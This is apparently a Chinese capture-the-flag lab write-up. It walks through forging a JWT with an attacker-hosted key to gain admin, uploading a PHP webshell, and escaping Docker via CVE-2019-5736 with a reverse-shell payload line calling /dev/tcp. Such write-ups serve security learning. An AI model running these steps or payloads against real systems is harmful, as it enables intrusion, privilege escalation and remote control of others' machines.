0x02 web渗透

注册登录以后发现能利用的功能太少了，只有发布笔记的功能，一个标题栏和正文栏


我首先用F12查看了页面登录的身份验证部分，在查看cookies的时候发现它是使用JWT的认证令牌，原理参考：

https://blog.csdn.net/qq_43380361/article/details/106117483

解码后发现有一个kid参数指向了带有私钥的内部地址，用于对令牌的签名。

攻击思路：我们可以使用自己生成的私钥对JWT令牌签名，修改有效的payload将普通用户权限设置为管理员权限。

首先通过openssl生成一个RSA私钥

opensslgenrsa -out privKey.key 1024cat privkey.key

我们创建一个python脚本(jwt-token.py)，通过我的RSA私钥生成一个自定义的JWT令牌，并将当前用户设置为管理员。注意：没有jwt库的先要装个jwt库,还有就是py脚本文件名格式要xxx-xxx.py，因为单纯jwt.py运行时候会出错，我也不知道为什么会出错，卡了我一个多小时，最终在百度上看到了要加个横岗或者下划线才可以成功运行，跟我的命名jwt-token.py就准没错

其中admin_cap为1就说明是管理员，然后kid后面的就是自己的私钥地址，后面需要通过http服务访问的。

python3 jwt-token.py

生成了令牌以后就可以登录进去了，记住先在生成的key文件所在的路径上使用python3 -m http.server 80开启http服务，让脚本能够访问密钥，然后使用burp抓包登录页面修改cookie中的jwt令牌（或者登录以后再刷新拦截），然后放包

因为这样做的话每次访问每一个页面都需要替换auth，建议在burp的option中通过添加永久cookie方式，这样每一次访问就可以自动替换cookie。然后下方有个regex match的单选框记得勾选。（切记不可关闭80端口的http服务）

然后导航栏会出现一条admin panel，说明我们已经是管理员身份了，然后点击admin panel，有个文件上传的功能。然后我们上传一个php的webshell。这里通过kali自带的webshell，然后端口监听，成功反弹shell。webshell在/usr/share/webshells/php/目录下，然后修改下监听的IP和端口就好了。

SHELL=/bin/bash script -q /dev/null   //升级shell

然后搜索文件，发现在/var/backups目录下有个tar.gz的疑似备份文件，下载试试（使用nc传输，这里不详细写）

然后发现文件夹里有个SSH登录的秘钥，我们就可以使用这个秘钥登录SSH

ssh -i id_rsa noah@10.10.10.230

根目录获得user flag：46d1ce135e789d5d8be215e2a2c2bf9b

0x03 提权

查看特权文件，发现有个docker运行命令。我们可以试着搜索docker容器逃逸漏洞，最终找到了CVE-2019-5736的漏洞：

https://github.com/Frichetten/CVE-2019-5736-PoC

然后修改一下poc

var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.17/1234 0>&1"

apt install golang-go //必须安装这个库，还有一个gogcc这种的库是没用的，卡了我好几个小时go build main.go //编译go文件

然后把文件传输给容器里，我们先进入/tmp目录下，然后

sudo /usr/bin/docker exec -it webapp-dev01 bash

进入容器里，打开本机80端口，在容器/tmp目录下传输poc文件

然后把main提升至可执行文件权限，./main运行（记得提前开好1234端口监听模式）

同时开启第二个SSH终端，执行

sudo /usr/bin/docker exec -it webapp-dev01 sh

然后在本机可以看到反弹shell成功

拿到root flag:1523e2e69c4bc3f69b287cf255a11b8a
